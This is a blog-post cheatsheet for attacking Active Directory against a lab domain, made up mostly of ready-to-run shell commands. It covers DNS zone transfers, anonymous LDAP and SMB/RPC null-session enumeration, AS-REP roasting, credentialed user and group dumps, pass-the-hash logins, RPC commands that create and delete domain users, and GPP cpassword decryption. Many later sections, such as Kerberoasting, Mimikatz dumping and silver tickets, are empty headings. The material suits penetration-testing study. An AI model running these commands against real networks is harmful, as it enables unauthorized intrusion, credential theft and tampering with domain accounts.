---
layout: post
title:  Attacking Active Directory Cheatsheet
description: Cheatsheet for Attacking Active Directory
date:   2024-11-01 01:00:00 +0300
image:  '/images/10000.jpg'
tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB, Kerberoasting, AS-REP-Roasting, DCSync, Silver-Ticket, ACLs, MSSQL, Credential-Dumping, Credential-Hunting]
---
### Uncredentialed Enumeration and Attacks
```shell
# DNS Zone Transfer
dig @172.16.150.10 AXFR vorkharium.com

# LDAP Anonymous Session Dump
ldapsearch -x -H ldap://172.16.150.10 -b "dc=vorkharium,dc=com"

# No-PreAuth Kerberos without Username
impacket-GetNPUsers vorkharium.com/ -dc-ip 172.16.150.10

# SMB Null Session with smbclient
smbclient -L 172.16.150.10 -N
smbclient -N -L //172.16.150.10
smbclient --no-pass -L //172.16.150.10
smbclient //172.16.150.10/Public -N
smbclient -U '%' -N \\\\172.16.150.10\\Public

# SMB Null Session with other tools
smbmap -H 172.16.150.10 -P 445
nxc smb 172.16.150.10 --shares -u 'guest' -p ''
crackmapexec smb 172.16.150.10 -u '' -p '' --shares
impacket-smbclient vorkharium.com/'':''@172.16.150.10

# RPC Null Session
rpcclient 172.16.150.10 -N
rpcclient -U "" -N 172.16.150.10
rpcclient -U="" 172.16.150.10

# RPC Commands
querydispinfo
enumdomusers
enumdomgroups
queryuser johnwick

# Command to get users and put them in users_rpc.txt
rpcclient -U "" 172.16.150.10 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users_rpc.txt

# impacket-rpcdump
impacket-rpcdump -port 135 vorkharium.com/'':''@172.16.150.10

# enum4linux
enum4linux -U 172.16.150.10

```
### Domain Password Policy Enumeration
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u 'vivi' -p 'Thundaga2000' --pass-pol
crackmapexec smb 172.16.150.10 -u 'tidus' -p 'ToZanarkand2001' --pass-pol

# enum4linux
enum4linux -U 172.16.150.10 # Without credentials
enum4linux -u john -p 'Password123!' -U 172.16.150.10

# CMD and PowerShell
net accounts
net user john /domain

# PowerShell (Some require AD Module to be installed)
Get-ADDefaultDomainPasswordPolicy
(Get-ADDomain).DefaultPasswordPolicy
Get-WmiObject -Class Win32_NetworkLoginProfile | Select-Object -Property Name, PasswordExpirationDate
```
### Domain and Local User Enumeration
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --users
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --users

# With impacket-GetADUsers
impacket-GetADUsers -all -dc-ip 172.16.150.10 vorkharium.com/john:'Password123!'

# My custom way of creating a domain_users.txt list with one command
impacket-GetADUsers -all -dc-ip 172.16.150.10 vorkharium.com/john:'Password123!' | awk 'NR>3 {print $1}' >> domain_users.txt

# LDAP
ldapsearch -x -H ldap://172.16.150.10 -D "john@vorkharium.com" -w 'Password123!' -b "dc=vorkharium,dc=com" "(objectClass=user)" sAMAccountName

# RPC
rpcclient -U 'john%Password123!' 172.16.150.10 -c "enumdomusers"

# enum4linux
enum4linux -u john -p 'Password123!' 172.16.150.10

# PowerView.ps1
Import-Module .\PowerView.ps1
Get-NetUser

# PowerShell (AD Module)
Get-ADUser -Filter * -Property SamAccountName
Get-ADUser -Filter * -Server 172.16.150.10 -Property SamAccountName

```
### Domain and Local Group Enumeration
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --groups
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --groups

# CMD and PowerShell
# Domain groups
net group /domain
net group "Domain Admins" /domain # Specifying a domain group

# Local groups
net localgroup
net localgroup Administrators

# Current User groups
whoami /groups

# PowerShell (Some require AD Module to be installed)
Get-ADGroup -Filter *
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Administrators"
Get-WmiObject -Class Win32_Group | Select-Object Name, Domain
Get-WmiObject -Class Win32_Group -ComputerName 172.16.150.10

# PowerShell Local Groups
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
```
### SMB Shares Credentialed Access and Enumeration
```shell
# Enumeration
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --shares
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --shares

# CMD and PowerShell
net view \\172.16.150.10

# enum4linux
enum4linux -S 172.16.150.10

# Connection
smbclient //172.16.150.10/Public -U john
impacket-smbclient vorkharium.com/john:'Password123!'@172.16.150.10

```
### RPC Credentialed Access and Enumeration
```shell
rpcclient -U "username%password" 172.16.150.10
# Using hash
rpcclient //172.16.150.10 -U vorkharium.com/john%1a06b4248879e68a498d3bac51bf91c9 --pw-nt-hash

# All RPC Queries
srvinfo
enumdomusers # Users
enumpriv # Works like "whoami /priv"
queryuser john # Detailed user info
getuserdompwinfo <RID> # Password Policy, use the previous command "queryuser" to get the RID to run this command
lookupnames john # SID of specified user
createdomuser john # Create a new user
deletedomuser john # Delete user
enumdomains
enumdomgroups
querygroup <group-RID> # Use the previous command "enumdomgroups" to get the RID to run this command
querydispinfo # Show description of all users
netshareenum # Enumerate Shares (This will only work if the current user we used to log in has permissions)
netshareenumall
lsaenumsid # SID from all users
```
### GPP cpassword
Check if we can find a file called Groups.xml inside SYSVOL folder through SMB Shares access. This file contains a "cpassword" field. To decrypt the hash in the cpassword field we can use the following command:
```shell
sudo apt install gpp-decrypt
gpp-decrypt F7HV9AXdOSpNAXTDhwZt0atMg6S/Q0TOnyGDYMIzL7o ​
# This will give us the credentials for the user the Groups.xml is related to
```
### Password Spraying
```shell

```
### Local PowerShell Enumeration
```shell

```
### Local Credential Hunting
```shell

```
### Runas and RunasCs.exe
```shell

```
### BloodHound, SharpHound.exe, bloodhound-python
```shell

```
### PowerView.ps1
```shell

```
### Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash
```shell

```
### Evil-WinRM - Access WinRM with Password or Pass-the-Hash
```shell

```
### xfreerdp - Access RDP with Password or Pass-the-Hash
```shell

```
### Kerberoasting with Impacket
```shell

```
### Kerberoasting with Rubeus.exe
```shell

```
### AS-REP Roasting with Impacket
```shell

```
### Remote Credential Dumping with Impacket and NetExec
```shell

```
### Local Credential Dumping with Mimikatz and Impacket
```shell

```
### Silver Ticket
```shell

```
### ACLs
```shell

```
### MSSQL to gain Shell
```shell

```